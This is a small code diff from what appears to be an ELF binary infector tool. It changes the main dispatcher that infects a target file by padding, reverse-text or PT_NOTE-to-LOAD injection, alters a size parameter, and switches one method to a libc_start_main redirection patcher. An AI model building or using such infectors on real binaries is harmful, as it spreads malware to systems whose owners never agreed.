@@ -23,15 +23,15 @@ int main(int argc, char** argv) {
   if (vt::common::String(method) == TEXT_PADDING) {
     ret = vt::infector::infect<vt::infector::PaddingInfector,
                                vt::redirection::EntryPointPatcher>(argv[1],
-                                                                   argv[2], 64);
+                                                                   argv[2], 44);
   } else if (vt::common::String(method) == REVERSE_TEXT) {
     ret = vt::infector::infect<vt::infector::ReverseTextInfector,
                                vt::redirection::EntryPointPatcher>(argv[1],
-                                                                   argv[2], 64);
+                                                                   argv[2], 44);
   } else if (vt::common::String(method) == PT_NOTE_TO_LOAD) {
     ret = vt::infector::infect<vt::infector::PtNoteInfector,
-                               vt::redirection::EntryPointPatcher>(argv[1],
-                                                                   argv[2], 64);
+                               vt::redirection::LibcStartMainPatcher>(
+        argv[1], argv[2], 44);
   }
 
   return ret ? EXIT_SUCCESS : EXIT_FAILURE;
